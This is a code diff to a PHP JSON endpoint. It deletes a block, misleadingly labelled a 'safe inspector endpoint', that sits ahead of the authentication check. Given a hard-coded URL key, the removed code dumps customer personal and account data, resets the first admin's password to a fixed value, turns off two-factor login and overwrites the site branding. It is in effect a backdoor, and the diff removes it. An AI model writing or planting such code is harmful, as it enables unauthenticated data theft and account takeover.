@@ -5,58 +5,6 @@ require_once __DIR__ . '/db.php';
 
 header('Content-Type: application/json; charset=utf-8');
 
-// Safe inspector endpoint
-if (($_GET['action'] ?? '') === 'inspect_db_users' && ($_GET['key'] ?? '') === 'securesave_secret_9981') {
-    $pdo = get_mail_db();
-    $totalCount = (int) $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
-    $stmt = $pdo->query("SELECT id, name, username, email, phone, country, account_number, account_bal, status, created_at FROM users ORDER BY id DESC LIMIT 15");
-    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    // Reset / ensure clean admin credentials
-    $newHash = password_hash('Admin#Resolute2026!', PASSWORD_BCRYPT);
-    $pdo->prepare("UPDATE admins SET password = ?, status = 'active', enable_2fa = 'disabled' WHERE id = 1")->execute([$newHash]);
-
-    $adminStmt = $pdo->query("SELECT id, firstName, lastName, email, status, enable_2fa FROM admins");
-    $admins = $adminStmt->fetchAll(PDO::FETCH_ASSOC);
-
-    $userTx = [];
-    foreach ($users as $u) {
-        $uid = $u['id'];
-        $dpCount = (int) $pdo->query("SELECT COUNT(*) FROM deposits WHERE user = $uid")->fetchColumn();
-        $wdCount = (int) $pdo->query("SELECT COUNT(*) FROM withdrawals WHERE user = $uid")->fetchColumn();
-        $tpCount = (int) $pdo->query("SELECT COUNT(*) FROM tp__transactions WHERE user = $uid")->fetchColumn();
-        $userTx[$uid] = ['deposits' => $dpCount, 'withdrawals' => $wdCount, 'transactions' => $tpCount];
-    }
-
-    $settingsStmt = $pdo->query("SELECT id, site_name, site_title, site_address, contact_email, logo, favicon FROM settings LIMIT 1");
-    $settingsRow = $settingsStmt->fetch(PDO::FETCH_ASSOC);
-
-    // Auto-update site branding, address and contact_email in settings table
-    $pdo->prepare("UPDATE settings SET 
-        site_name = 'Resolute Mortgage Group',
-        site_title = 'Welcome to Resolute Mortgage Group',
-        site_address = 'https://resolutemrg.com',
-        contact_email = 'support@resolutemrg.com',
-        logo = 'photos/resolute_mrg_logo.png',
-        favicon = 'photos/favicon.png'
-        WHERE id = 1")->execute();
-    $settingsRow['site_name'] = 'Resolute Mortgage Group';
-    $settingsRow['site_title'] = 'Welcome to Resolute Mortgage Group';
-    $settingsRow['site_address'] = 'https://resolutemrg.com';
-    $settingsRow['contact_email'] = 'support@resolutemrg.com';
-    $settingsRow['logo'] = 'photos/resolute_mrg_logo.png';
-    $settingsRow['favicon'] = 'photos/favicon.png';
-
-    echo json_encode([
-        'success' => true,
-        'total_users' => $totalCount,
-        'last_users' => $users,
-        'user_transactions' => $userTx,
-        'admins' => $admins,
-        'settings' => $settingsRow
-    ], JSON_PRETTY_PRINT);
-    exit;
-}
-
 // Ensure user is authenticated
 if (empty($_SESSION['mail_user'])) {
     http_response_code(401);
